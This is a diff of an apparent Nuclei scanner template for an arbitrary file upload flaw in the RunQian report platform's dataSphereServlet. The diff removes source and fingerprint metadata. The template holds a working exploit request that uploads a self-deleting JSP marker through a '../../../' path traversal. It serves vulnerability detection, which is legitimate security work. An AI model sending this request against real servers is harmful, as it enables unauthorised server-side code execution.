@@ -3,12 +3,8 @@ info:
   name: 润乾报表平台 dataSphereServlet 任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/tym2pryufzlqtqhe'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: tym2pryufzlqtqhe
-    fofa: body="/raqsoft"||body="润乾报表"
 http:
 - raw:
   - 'POST /demo/servlet/dataSphereServlet?action=38 HTTP/1.1
@@ -38,8 +34,6 @@ http:
     Connection: close
 
 
-
-
     ------FGjhgjhvuyvuhyvulyvjhvktuvkfytft
 
 
@@ -47,8 +41,6 @@ http:
 
 
     Content-Type: text/plain
-
-
 
 
     <% out.println("DudeSuite");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
@@ -60,8 +52,6 @@ http:
     Content-Disposition: form-data; name="path"
 
 
-
-
     ../../../
 
 
@@ -69,8 +59,6 @@ http:
 
 
     Content-Disposition: form-data; name="saveServer"
-
-
 
 
     1
